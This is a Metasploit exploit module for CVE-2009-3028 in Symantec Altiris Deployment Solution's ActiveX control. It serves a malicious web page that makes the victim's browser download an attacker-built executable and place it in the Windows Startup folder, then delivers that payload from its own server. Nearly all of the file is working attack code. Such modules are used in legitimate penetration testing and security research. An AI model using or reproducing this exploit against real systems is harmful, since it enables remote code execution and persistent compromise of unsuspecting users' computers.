##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Symantec Altiris Deployment Solution ActiveX Control Arbitrary File Download and Execute',
      'Description'    => %q{
          This module allows remote attackers to install and execute arbitrary files on a users file system via
        AeXNSPkgDLLib.dll (6.0.0.1418). This module was tested against Symantec Altiris Deployment Solution 6.9 sp3.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'MC' ],
      'References'     =>
        [
          [ 'BID', '36346' ],
          [ 'CVE', '2009-3028' ],
          [ 'OSVDB', '57893' ]
        ],
      'Payload'        =>
        {
          'Space'           => 2048,
          'StackAdjustment' => -3500,
        },
      'DefaultOptions' =>
        {
          'HTTP::compression' => 'gzip'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => '2009-09-09',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('PATH',    [ true, "The path to place the executable.", 'C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\' ]),
        OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
      ])
  end

  def autofilter
    false
  end

  def check_dependencies
    use_zlib
  end

  def on_request_uri(cli, request)

    payload_url =  "http://"
    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
    payload_url += ":" + datastore['SRVPORT'].to_s + get_resource() + "/PAYLOAD"

    if (request.uri.match(/PAYLOAD/))
      return if ((p = regenerate_payload(cli)) == nil)
      data = generate_payload_exe({ :code => p.encoded })
      print_status("Sending payload EXE")
      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
      return
    end

    vname  = rand_text_alpha(rand(100) + 1)
    exe    = rand_text_alpha_upper(rand(5) + 1)

    content = %Q|<html>
<head>
<script>
try {
  var #{vname} = new ActiveXObject('Altiris.AeXNSPkgDL.1');
  #{vname}.DownloadAndInstall("#{payload_url}/#{exe}.EXE", "#{datastore['PATH']}\\\\#{exe}.EXE", "#{datastore['PATH']}\\\\#{exe}.EXE", "", "");
} catch( e ) { window.location = 'about:blank' ; }
</script>
</head>
</html>
|

    print_status("Sending #{self.name}")

    send_response_html(cli, content)

    handler(cli)

  end

end
=begin
C:\Program Files\Altiris\eXpress\Deployment Web Console\DSWeb\utils\AltirisNSConsole.zip

altiris_deploymentsolution_win_6_9_sp3_server.zip

[id(0x00000007), helpstring("method DownloadAndInstall")]
void DownloadAndInstall(
  [in] BSTR Src,
  [in] BSTR Dest,
  [in] BSTR InstCmdLine,
  [in] BSTR UpgdCmdLine,
  [in] BSTR ProdCode);
=end
